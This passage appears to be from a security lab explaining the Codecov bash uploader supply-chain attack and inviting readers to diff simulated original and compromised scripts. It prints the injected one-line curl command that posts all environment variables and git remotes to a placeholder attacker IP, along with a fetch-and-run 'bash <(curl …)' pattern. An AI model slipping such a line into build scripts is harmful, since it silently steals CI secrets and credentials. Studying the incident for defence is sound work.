The Codecov bash uploader was a script hosted at `codecov.io/bash` that
thousands of CI pipelines downloaded and executed on every build:

```bash
bash <(curl -s https://codecov.io/bash)
```

The attackers modified the script on Codecov's server by exploiting a
flaw in the Docker image creation process. The modified script added
a single line:

```bash
curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" \
  http://<attacker-ip>/upload/v2 || true
```

This line:
1. Collects all environment variables (`env`) -- including CI secrets,
   AWS keys, GitHub tokens, and database passwords
2. Collects git remote URLs (to identify the victim)
3. Sends everything to the attacker's server
4. Uses `|| true` to suppress errors (the upload failure is silent)

Examine the simulated attack:

```bash
# The original uploader
cat /app/codecov/uploader_original.sh

# The compromised uploader
diff /app/codecov/uploader_original.sh /app/codecov/uploader_compromised.sh
```
